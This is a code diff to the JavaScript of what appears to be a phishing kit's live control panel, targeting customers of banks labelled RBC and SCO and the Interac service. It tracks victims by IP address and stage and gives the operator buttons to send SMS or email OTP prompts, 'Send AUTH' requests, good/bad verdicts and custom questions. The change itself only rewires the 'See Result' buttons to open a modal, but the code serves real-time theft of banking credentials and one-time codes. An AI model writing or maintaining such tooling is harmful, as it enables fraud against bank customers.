@@ -33,28 +33,28 @@ function getUserDivInnerHTML(ipAddress, details, color) {
 function getActionButtonHTML(details) {
   // Modify this function to include other actions based on `details`
   if (details.page != 'RBC' && details.page != 'SCO' && details.stage != 'CAPTCHA' && details.stage != 'Finish' && details.stage != 'Interac' && details.stage != 'Loading' && details.stage != 'OTP') {
-    return `              <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
+    return `              <button type="button" class="m-1 btn btn-primary" data-bs-toggle="modal" data-bs-target="#resultsModal">See Result</button>
     <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
     <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>`;
   } else if (details.stage == "OTP") {
-    return `<a href="#" class="m-1 btn btn-primary results-button">See Result</a>`;
+    return `<button type="button" class="m-1 btn btn-primary" data-bs-toggle="modal" data-bs-target="#resultsModal">See Result</button>`;
   } else if (details.stage == "Loading") {
-    return `  <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
+    return `  <button type="button" class="m-1 btn btn-primary" data-bs-toggle="modal" data-bs-target="#resultsModal">See Result</button>
     <a href="#" class="m-1 btn btn-success send-otp-good-button">Good</a>
     <a href="#" class="m-1 btn btn-danger send-otp-bad-button">Bad</a>`;
   } else if (details.page == 'SCO' && details.stage != 'Finish') {
-    return ` <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
+    return ` <button type="button" class="m-1 btn btn-primary" data-bs-toggle="modal" data-bs-target="#resultsModal">See Result</button>
     <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
     <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
     <a href="#" class="m-1 btn btn-warning send-auth-button">Send AUTH</a>`;
   } else if (details.page == 'RBC' && details.stage != 'Finish') {
-    return `  <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
+    return `  <button type="button" class="m-1 btn btn-primary" data-bs-toggle="modal" data-bs-target="#resultsModal">See Result</button>
     <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
     <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
     <a href="#" class="m-1 btn btn-warning send-auth-button">Send AUTH</a>
     <button class="m-1 btn btn-warning customQuestionTrigger" type="button" >Custom Question</button>`;
   } else {
-    return ` <a href="#" class="m-1 btn btn-primary results-button">See Result</a>`;
+    return ` <button type="button" class="m-1 btn btn-primary" data-bs-toggle="modal" data-bs-target="#resultsModal">See Result</button>`;
   }
   // Add other conditions as needed
   return '';
@@ -176,8 +176,6 @@ function showResultsModal(_ipAddress) {
         }
       }
     })
-    const modal = new bootstrap.Modal(document.getElementById('resultsModal'));
-    modal.show();
   })
 }
 
